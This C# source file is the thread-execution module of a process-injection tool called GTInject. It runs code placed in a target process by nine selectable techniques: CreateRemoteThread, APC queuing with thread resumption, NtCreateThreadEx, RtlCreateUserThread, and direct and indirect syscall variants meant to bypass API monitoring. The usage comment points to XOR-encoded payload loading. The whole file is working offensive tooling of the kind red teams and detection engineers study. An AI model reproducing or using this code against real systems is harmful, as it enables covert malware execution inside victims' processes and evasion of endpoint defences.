﻿using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using static GTInject.memoryOptions.memory;
using System.Net.Http;
using System.Xml.Linq;
using GTInject.SysCalls;
using System.Linq.Expressions;

namespace GTInject.Injection
{
    internal class threadexec
    {
        public static IntPtr SelectThreadOption(IntPtr memaddr, int execoption, Process pid, int tid)
        {
            switch (execoption)
            {
                case 100:
                    return execopt100(memaddr, pid, tid);
                case 101:
                    return execopt101(memaddr, pid, tid);
                case 200:
                    return execopt200(memaddr, pid, tid);
                case 201:
                    return execopt201(memaddr, pid, tid);
                case 202:
                    return execopt202(memaddr, pid, tid);
                case 300:
                    return execopt300(memaddr, pid, tid);
                case 301:
                    return execopt301(memaddr, pid, tid);
                case 302:
                    return execopt302(memaddr, pid, tid);
                case 303:
                    return execopt303(memaddr, pid, tid);
                default:
                    Console.WriteLine( "[-] Not a valid Thread Execution option integer");
                    return IntPtr.Zero;
            }

        }

        private static IntPtr execopt100(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 100 == CreateRemoteThread (WINAPI)
            /////////////////////////////////////

            Console.WriteLine("     Execute code using WINAPIs CreateRemoteThread");
            IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
            if (remoteThreadResp != IntPtr.Zero)
            {
                Console.WriteLine("[+] WinAPI CreateRemoteThread with response : " + remoteThreadResp + "\n");

            }
            return remoteThreadResp;
        }

        private static IntPtr execopt101(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 101 == QueueUserAPC & ResumeThread (WINAPI)
            /////////////////////////////////////
            Console.WriteLine("     Execute code using WINAPIs QueueUserAPC, ResumeThread");

            //var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
            var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);

            Console.WriteLine("     Returned OpenThread " + threadHandle);

            var QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero);

            if (QuApcResp == 0) // if succeeds, return value is non-zero
            {
                Console.WriteLine("[-] Failed QueueUserAPC WINAPI execution");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] WinAPI QueueUserAPC called\n");

                var threadObjects = ProcID.Threads;
                for (int i = 0; i < threadObjects.Count; i++)
                {
                    try
                    {
                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                        {
                            Console.WriteLine("     thread is suspended, so calling resume Thread WINAPI on this");
                            var ResThreadResp = ResumeThread(threadHandle);
                            if (ResThreadResp == -1)
                            {
                                Console.WriteLine("     resume Thread failed");
                                return IntPtr.Zero;
                            }
                            else
                            {
                                Console.WriteLine("[+] WinAPI ResumeThread called\n");
                            }
                        }
                    }
                    catch (System.InvalidOperationException e)
                    {
                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
                        Console.WriteLine("     " + e.Message);
                    }

                }
                return threadHandle; // returning an IntPtr, threadhandle is already an IntPtr
            }
            
            //If thread state is Suspended, must resume, If Execution Delay, will trigger automatically, no API call needed, don't recall thread in Wait state action

        }

        private static IntPtr execopt200(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 200 == NtCreateThreadEx (NTAPI)
            /////////////////////////////////////
            ///
            //Create a remote thread and execute it.
            //IntPtr hThread = CreateRemoteThread(hremoteProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);

            Console.WriteLine("     Execute code using NTAPIs NtCreateThreadEx");

            IntPtr hRemoteThread;
            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, ProcID.Handle, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[+] NTAPI NtCreateThreadEx with response : " + hThread + "\n");

            return hRemoteThread;
        }

        private static IntPtr execopt201(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 201 == RtlCreateUserThread (NTAPI)
            /////////////////////////////////////
            Console.WriteLine("     Execute code using NTAPIs RtlCreateUserThread");
            IntPtr targetThread = IntPtr.Zero;
            ClientId id = new ClientId();
            int hthread = RtlCreateUserThread(ProcID.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, memaddr, IntPtr.Zero, ref targetThread, ref id);
            if (hthread == 0)
            {
                Console.WriteLine("[+] NTAPI RtlCreateUserThread resp : " + hthread + "\n");
                return targetThread;
            }
            else
            {
                Console.WriteLine("[-] RtlCreateUserThread Failed");
                return IntPtr.Zero;
            }
        }


        private static IntPtr execopt202(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 202 == NtQueueApcThread, NtResumeThread (NTAPI)
            /////////////////////////////////////        
            // Will also need NtOpenThread? 
            Console.WriteLine("     Execute code using NTAPIs NtQueueApcThread, NtResumeThread");

            //var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
/*            IntPtr targetThread = (IntPtr)ThreadID;
            ClientId id = new ClientId();
            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
            var NtOpenTResp = NtOpenThread(out targetThread,(uint)ThreadAccessRights.AllAccess, ref objAttributes, ref id );
*/

            // Didn't see any easy way to get a handle the a thread ID in c#. WINAPI for OpenThread seems best, though I'd prefer NTAPI series methods to stay as exclusive to NT level as possible
            var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);

            //Console.WriteLine(  " NtOpenThread Response : " + NtOpenTResp);
            Console.WriteLine("     returned thread handle " + targetThread);

            var ntQResp = NtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
            if (ntQResp != 0)
            {
                Console.WriteLine("     ntQResp was non-success");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] NTAPI NtQueueApcThread called\n");
                var threadObjects = ProcID.Threads;

                try
                {
                    for (int i = 0; i < threadObjects.Count; i++)
                    {
                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                        {
                            Console.WriteLine("     thread is suspended, so calling NtResumeThread on this");
                            var ntResTResp = NtResumeThread(targetThread, 0);
                            if (ntResTResp != 0)
                            {
                                Console.WriteLine("     resume Thread failed");
                                return IntPtr.Zero;
                            }
                            else
                            {
                                Console.WriteLine("[+] NTAPI NtResumeThread called\n");
                            }
                        }
                    }
                }

                catch (System.InvalidOperationException e)
                {
                    Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
                    Console.WriteLine("     " + e.Message);
                }
                return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
            }
        }
        private static IntPtr execopt300(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 300 == Direct Syscall - NtCreateThreadEx
            /////////////////////////////////////

            // set up the syscall for NtCreateThreadEx
            var hProcess = ProcID.Handle;
            IntPtr hThread = IntPtr.Zero;
            var status = Syscalls.SysclNtCreateThreadEx(out hThread, WinNative.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            if (status == WinNative.NTSTATUS.Success)
            {
                Console.WriteLine("[+] Direct Syscall to NtCreateThreadEx " + status + "\n");
                return memaddr;
            }
            else
            {
                Console.WriteLine("[-] Direct Syscall to NtCreateThreadEx " + status);

                return IntPtr.Zero;
            }

        }


        private static IntPtr execopt301(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 301 == Direct Syscall - NtQueueApcThread, NtResumeThread
            /////////////////////////////////////

            var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);

            // set up the syscall for NtQueueApcThread
            var hProcess = ProcID.Handle;
            IntPtr hThread = IntPtr.Zero;
            var status = Syscalls.SysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
            Console.WriteLine("     Direct Syscall to NtQueueApcThread " + status);

            if (status != 0)
            {
                Console.WriteLine("     QAPCThread Direct Syscall was non-success");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] Direct Syscall NtQueueApcThread called\n");
                var threadObjects = ProcID.Threads;
                for (int i = 0; i < threadObjects.Count; i++)
                {
                    try
                    {
                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                        {
                            Console.WriteLine("     thread is suspended, so calling Direct Syscall NtResumeThread on this");
                            var ntResTResp = Syscalls.SysclNtResumeThread(targetThread, 0);
                            if (ntResTResp != 0)
                            {
                                Console.WriteLine("     Direct Syscall NtResumeThread failed");
                                return IntPtr.Zero;
                            }
                            else
                            {
                                Console.WriteLine("[+] Direct Syscall NtResumeThread called\n");
                            }
                        }
                    }
                    catch (System.InvalidOperationException e)
                    {
                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
                        Console.WriteLine("     " + e.Message);
                    }


                }
                return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
            }

        }

        private static IntPtr execopt302(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 302 == Indirect Syscall - NtCreateThreadEx
            /////////////////////////////////////

            // set up the syscall for NtCreateThreadEx
            var hProcess = ProcID.Handle;
            IntPtr hThread = IntPtr.Zero;
            var status = Syscalls.IndirectSysclNtCreateThreadEx(out hThread, WinNative.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            if (status == WinNative.NTSTATUS.Success)
            {
                Console.WriteLine("[+] Indirect Syscall to CreateThread " + status + "\n");

                return memaddr;
            }
            else
            {
                return IntPtr.Zero;
            }

        }

        private static IntPtr execopt303(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 303 == Indirect Syscall - NtQueueApcThread, NtResumeThread
            /////////////////////////////////////

            var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);

            // set up the syscall for NtQueueApcThread
            var hProcess = ProcID.Handle;
            IntPtr hThread = IntPtr.Zero;
            var status = Syscalls.IndirectSysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
            Console.WriteLine("     Indirect Syscall to NtQueueApcThread " + status);

            if (status != 0)
            {
                Console.WriteLine("     QAPCThread Indirect Syscall was non-success");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] Indirect Syscall NtQueueApcThread called\n");
                var threadObjects = ProcID.Threads;
                for (int i = 0; i < threadObjects.Count; i++)
                {
                    try
                    {
                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                        {
                            Console.WriteLine("     thread is suspended, so calling Indirect Syscall NtResumeThread on this");
                            var ntResTResp = Syscalls.IndirectSysclNtResumeThread(targetThread, 0);
                            if (ntResTResp != 0)
                            {
                                Console.WriteLine("     Indirect Syscall NtResumeThread failed");
                                return IntPtr.Zero;
                            }
                            else
                            {
                                Console.WriteLine("[+] Indirect Syscall NtResumeThread called\n");
                            }
                        }
                    } 
                    catch (System.InvalidOperationException e)
                    {
                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
                        Console.WriteLine("     " + e.Message);

                    }

                }
                return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
            }

        }



        /////////////////////////////////////
        // Supporting functions
        /////////////////////////////////////


        /////////////////////////////////////
        // PInvokes and Enums / Structures
        /////////////////////////////////////
        [StructLayout(LayoutKind.Sequential)]
        public struct ClientId
        {
            public IntPtr processHandle;
            public IntPtr threadHandle;
        }
        public struct OBJECT_ATTRIBUTES
        {
            public ulong Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public ulong Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [Flags]
        public enum    ThreadAccess : int
        {
            TERMINATE           = (0x0001)  ,
            SUSPEND_RESUME      = (0x0002)  ,
            GET_CONTEXT         = (0x0008)  ,
            SET_CONTEXT         = (0x0010)  ,
            SET_INFORMATION     = (0x0020)  ,
            QUERY_INFORMATION       = (0x0040)  ,
            SET_THREAD_TOKEN    = (0x0080)  ,
            IMPERSONATE         = (0x0100)  ,
            DIRECT_IMPERSONATION    = (0x0200)
        }

        public enum ThreadAccessRights : uint
        {
            Terminate = 0x0001,
            SuspendResume = 0x0002,
            Alert = 0x0004,
            GetContext = 0x0008,
            SetContext = 0x0010,
            SetInformation = 0x0020,
            QueryInformation = 0x0040,
            SetThreadToken = 0x0080,
            Impersonate = 0x0100,
            DirectImpersonation = 0x0200,
            SetLimitedInformation = 0x0400,
            QueryLimitedInformation = 0x0800,
            AllAccess = 0x1FFFFF,
            GenericRead = GenericAccessRights.GenericRead,
            GenericWrite = GenericAccessRights.GenericWrite,
            GenericExecute = GenericAccessRights.GenericExecute,
            GenericAll = GenericAccessRights.GenericAll,
            Delete = GenericAccessRights.Delete,
            ReadControl = GenericAccessRights.ReadControl,
            WriteDac = GenericAccessRights.WriteDac,
            WriteOwner = GenericAccessRights.WriteOwner,
            Synchronize = GenericAccessRights.Synchronize,
            MaximumAllowed = GenericAccessRights.MaximumAllowed,
            AccessSystemSecurity = GenericAccessRights.AccessSystemSecurity
        }

        public enum GenericAccessRights : uint
        {
            None = 0,
            Access0 = 0x00000001,
            Access1 = 0x00000002,
            Access2 = 0x00000004,
            Access3 = 0x00000008,
            Access4 = 0x00000010,
            Access5 = 0x00000020,
            Access6 = 0x00000040,
            Access7 = 0x00000080,
            Access8 = 0x00000100,
            Access9 = 0x00000200,
            Access10 = 0x00000400,
            Access11 = 0x00000800,
            Access12 = 0x00001000,
            Access13 = 0x00002000,
            Access14 = 0x00004000,
            Access15 = 0x00008000,
            Delete = 0x00010000,
            ReadControl = 0x00020000,
            WriteDac = 0x00040000,
            WriteOwner = 0x00080000,
            Synchronize = 0x00100000,
            AccessSystemSecurity = 0x01000000,
            MaximumAllowed = 0x02000000,
            GenericAll = 0x10000000,
            GenericExecute = 0x20000000,
            GenericWrite = 0x40000000,
            GenericRead = 0x80000000,
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(uint desiredAccess, bool inheritHandle, uint threadId);

        [DllImport("kernel32.dll")]
        public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        public static extern int ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

        [DllImport("ntdll.dll")]
        public static extern int RtlCreateUserThread(IntPtr processHandle, IntPtr securityDescriptor, bool createSuspended, uint zeroBits, IntPtr zeroReserve, IntPtr zeroCommit, IntPtr startAddress, IntPtr startParameter, ref IntPtr threadHandle, ref ClientId clientid);

        [DllImport("ntdll.dll")]
        public static extern int NtOpenThread(out IntPtr hThread, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref ClientId cId );

        [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern NTSTATUS NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, UInt32 ApcRoutineContext, IntPtr ApcStatusBlock, Int32 ApcReserved);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern NTSTATUS NtResumeThread(IntPtr hThread, uint dwSuspendCount);

        //https://www.csharpcodi.com/vs2/2027/sandbox-attacksurface-analysis-tools/NtApiDotNet/NtThread.cs/

    }
}
